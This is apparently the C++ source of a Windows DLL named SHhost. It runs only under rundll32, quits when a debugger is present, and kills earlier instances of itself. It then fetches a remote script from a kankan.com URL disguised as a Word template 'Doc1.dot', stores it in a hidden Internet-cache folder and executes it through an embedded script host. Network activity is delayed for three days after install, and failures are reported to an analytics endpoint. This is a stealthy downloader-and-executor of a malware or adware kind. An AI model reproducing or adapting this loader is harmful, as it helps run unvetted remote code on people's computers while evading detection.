// SHhost.cpp : DLL 导出的实现。

#include "stdafx.h"
#include "resource.h"
#include "SHhost.h"
#include "dlldatax.h"
#include "XScriptHost.h"
#include "atlstr.h"
#include "tlhelp32.h"
#include "shlobj.h"
#include <time.h>

class CSHhostModule : public CAtlDllModuleT< CSHhostModule >
{
public :
	DECLARE_LIBID(LIBID_SHhostLib)
//	DECLARE_REGISTRY_APPID_RESOURCEID(IDR_SHHOST, "{47067FAE-36C3-47A8-88E9-3D5AA425B961}")
};

CSHhostModule _AtlModule;


// DLL 入口点
extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hInstance);
		TCHAR szPath[_MAX_PATH] = {0};
		GetModuleFileName(NULL, szPath, _MAX_PATH);
		LPCTSTR pszNames[] = { _T("rundll32.exe") };
		bool bMatch = false;
		LPTSTR lpszFindName = szPath;
		lpszFindName += (int)_tcslen(szPath);
		while('\\' != *lpszFindName && '\\' != *lpszFindName)
			lpszFindName--;
		lpszFindName++;
		int i = 0;
		for( ; i < sizeof pszNames / sizeof pszNames[0]; i++)
		{
			int n = _tcsnicmp( lpszFindName,  pszNames[i], _tcslen(pszNames[i]));
			if(0 == n)
			{
				bMatch = true;
				break;
			}			
		} 
		if(!bMatch)
			return FALSE;
		if(IsDebugging())
			return FALSE; 
	}

#ifdef _MERGE_PROXYSTUB
    if (!PrxDllMain(hInstance, dwReason, lpReserved))
        return FALSE;
#endif
	hInstance;
    return _AtlModule.DllMain(dwReason, lpReserved); 
}


// 用于确定 DLL 是否可由 OLE 卸载
STDAPI DllCanUnloadNow(void)
{
#ifdef _MERGE_PROXYSTUB
    HRESULT hr = PrxDllCanUnloadNow();
    if (FAILED(hr))
        return hr;
#endif
    return _AtlModule.DllCanUnloadNow();
}


// 返回一个类工厂以创建所请求类型的对象
STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv)
{
#ifdef _MERGE_PROXYSTUB
    if (PrxDllGetClassObject(rclsid, riid, ppv) == S_OK)
        return S_OK;
#endif
    return _AtlModule.DllGetClassObject(rclsid, riid, ppv);
}


// DllRegisterServer - 将项添加到系统注册表
STDAPI DllRegisterServer(void)
{
    // 注册对象、类型库和类型库中的所有接口
    HRESULT hr = _AtlModule.DllRegisterServer();
#ifdef _MERGE_PROXYSTUB
    if (FAILED(hr))
        return hr;
    hr = PrxDllRegisterServer();
#endif
	return hr;
}


// DllUnregisterServer - 将项从系统注册表中移除
STDAPI DllUnregisterServer(void)
{
	HRESULT hr = _AtlModule.DllUnregisterServer();
#ifdef _MERGE_PROXYSTUB
    if (FAILED(hr))
        return hr;
    hr = PrxDllRegisterServer();
    if (FAILED(hr))
        return hr;
    hr = PrxDllUnregisterServer();
#endif
	return hr;
}


void KillProcessTree(DWORD dwProcessID, DWORD dwExceptPID)
{ 
	PROCESSENTRY32 info;
	info.dwSize = sizeof(PROCESSENTRY32 );
	//结束进程句柄
	HANDLE hProcess = NULL;
	DWORD dwParentPID = 0;
	DWORD dwChildPID = 0;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwProcessID);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return ;
	}
	// 遍历进程快照，轮流显示每个进程的信息
	BOOL bMore = Process32First(hProcessSnap, &info);


	while( bMore != FALSE)
	{
		// 如果找个父进程句柄是需要关闭的ID，就已经完成查找
		if (dwProcessID == info.th32ParentProcessID)
		{
			dwParentPID = info.th32ParentProcessID;
			dwChildPID = info.th32ProcessID;
			break;
		}
		// 如果找到dwProcessID进程，就只保存父线程ID
		if (dwProcessID == info.th32ProcessID)
		{
			dwParentPID = info.th32ProcessID;
		}
		bMore = Process32Next(hProcessSnap, &info);
	}
	if (dwChildPID)
	{
		// 如果有子线程先结束子线程
		hProcess=OpenProcess(PROCESS_TERMINATE, FALSE, dwChildPID);
		if (NULL == hProcess )
		{
			return ;
		}
		if(dwChildPID != dwExceptPID)
			TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	if (dwParentPID)
	{
		hProcess=OpenProcess(PROCESS_TERMINATE, FALSE, dwParentPID);
		if (NULL == hProcess)
		{
			return ;
		}
		if(dwParentPID != dwExceptPID)
			TerminateProcess(hProcess, 0);
		CloseHandle(hProcessSnap);
	}
}
class CMessageLoop
{
public:
		int Run()
	{
		BOOL bDoIdle = TRUE;
		int nIdleCount = 0;
		BOOL bRet;
		MSG m_msg;
		for(;;)
		{
			while(bDoIdle && !::PeekMessage(&m_msg, NULL, 0, 0, PM_NOREMOVE))
			{
				//if(!OnIdle(nIdleCount++))
					bDoIdle = FALSE;
			}

			bRet = ::GetMessage(&m_msg, NULL, 0, 0);

			if(bRet == -1)
			{
				//ATLTRACE2(atlTraceUI, 0, _T("::GetMessage returned -1 (error)\n"));
				continue;   // error, don't process
			}
			else if(!bRet)
			{
				//ATLTRACE2(atlTraceUI, 0, _T("CMessageLoop::Run - exiting\n"));
				break;   // WM_QUIT, exit message loop
			}

			//if(!PreTranslateMessage(&m_msg))
			{
				::TranslateMessage(&m_msg);
				::DispatchMessage(&m_msg);
			}

			if(IsIdleMessage(&m_msg))
			{
				bDoIdle = TRUE;
				nIdleCount = 0;
			}
		}

		return (int)m_msg.wParam;
	}
	
	static BOOL IsIdleMessage(MSG* pMsg)
	{
		// These messages should NOT cause idle processing
		switch(pMsg->message)
		{
		case WM_MOUSEMOVE:
#ifndef _WIN32_WCE
		case WM_NCMOUSEMOVE:
#endif // !_WIN32_WCE
		case WM_PAINT:
		case 0x0118:	// WM_SYSTIMER (caret blink)
			return FALSE;
		}

		return TRUE;
	}
};

//CAppModule _Module;
#if defined(WIN64) || defined(_WIN64)
#pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YAXPEAUHWND__@@PEAUHINSTANCE__@@PEA_WH@Z,PRIVATE") 
#else
#pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
//__declspec(dllexport)
#endif
void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
{
	TSAUTO();
	if (IsDebugging())
	{
		return;
	}
	//
	HWND hWnd = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") ,_T(""));
	if(hWnd)
	{
		DWORD dwProcessID = 0;
		GetWindowThreadProcessId(hWnd, &dwProcessID);
		TSDEBUG4CXX("TerminateProcess hWnd="<<hWnd<<" , dwProcessID="<<dwProcessID<<" ");
		KillProcessTree(dwProcessID, (DWORD)-1);
		//HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);
		//TerminateProcess(hProcess, (UINT)-100);
	}
	hWnd = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") ,_T("1"));
	if(hWnd)
	{
		DWORD dwProcessID = 0;
		GetWindowThreadProcessId(hWnd, &dwProcessID);
		TSDEBUG4CXX("TerminateProcess hWnd="<<hWnd<<" , dwProcessID="<<dwProcessID<<" ");
		KillProcessTree(dwProcessID,(DWORD)-1);
		//HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);
		//TerminateProcess(hProcess, (UINT)-100);
	}
	//////////////
	HWND hWnd2 = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") , _T("0"));
	if(hWnd2)
	{
		TSDEBUG4CXX("exit for hWnd2="<<hWnd2);
		return ;
	}
	 
	CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	
	TCHAR szDestLaunch[2048] = {0};
	wcscpy(szDestLaunch, L"http://conf.xmp.kankan.com/config/Doc1.dot");

	CRegKey key;
	TCHAR szLaunchPath [2048] = {0};
	TCHAR szPID[32] = {0};
	DWORD dwInstallTime = 0;
	hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{
		DWORD dw = _MAX_PATH;
		key.QueryStringValue(L"Launch", szLaunchPath, &dw );
		if(PathFileExists(szLaunchPath))
		{
			_tcscpy(szDestLaunch, szLaunchPath); 
		}
		dw = 17;
		key.QueryStringValue(L"PID", szPID, &dw);
		key.QueryDWORDValue(L"instt", dwInstallTime);

		key.Close();
	}
	TSDEBUG4CXX(" szDestLaunch : "<<szDestLaunch<<" dwInstallTime : "<<dwInstallTime);
	// 加载	
	TCHAR szPath[_MAX_PATH] = {0};
	TCHAR szTempPath[_MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szPath);
	PathAddBackslash(szPath);
	PathAppend(szPath, _T("Content.mso\\Doc1.dot"));	
	
	DWORD dwOffset = (DWORD)time(0) - dwInstallTime;
	if( ( (3*24*60*60 > dwOffset) || GetTickCount()<5*60*1000) && PathFileExists(szPath)) //三天内不产生网络请求
	{
		hr = S_OK;
	}
	else
	{
		hr = URLDownloadToFile(NULL, szDestLaunch, szPath, _MAX_PATH, NULL); 
		//SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
		//wcscpy(szTempPath, szPath);
		//PathAppend(szTempPath, _T("..\\..\\Doc1.dot"));
		//DeleteFile(szTempPath);
		TSDEBUG4CXX("downloadurl : "<<szDestLaunch<<" to " <<szPath<<" return " <<hr);
	}
	//wcscpy(szPath, L"c:\\scripthost.js");
	if(!PathFileExists(szPath))
	{
		CStringW url;
		url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=downloadingfile_failed_Doc1.dot&el=%s" ,
			szPID, szPath);
		URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);
		return;
	}
	//_Module.AddMessageLoop(&theLoop);
	CComPtr<IClassFactory> spCF;
	DllGetClassObject(*__pobjMap_CXScriptHost->pclsid, IID_IClassFactory,  (LPVOID*)&spCF);
	if(!spCF)
		return ;

	CComPtr<IXScriptHost> spScriptHost;
	hr = spCF->CreateInstance(NULL, IID_IXScriptHost, (void **)&spScriptHost);
	if(SUCCEEDED(hr) && spScriptHost)
	{
		spScriptHost->Load( szPath, 0 );
		CComVariant v;
		hr = spScriptHost->Run(&v);
		if(SUCCEEDED(hr))
		{
			CMessageLoop theLoop;
			int nRet = theLoop.Run();
			nRet;
		}
		else
		{
			CStringW url;
			url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=downloadingfile_loadfailed_Doc1.dot&el=%s" ,
				szPID, szPath);
			URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);
		}
		v.Clear();	
		spScriptHost.Release();
		spCF.Release();
		//TerminateProcess(GetCurrentProcess(), nRet);
	}	
	
	return ;
}
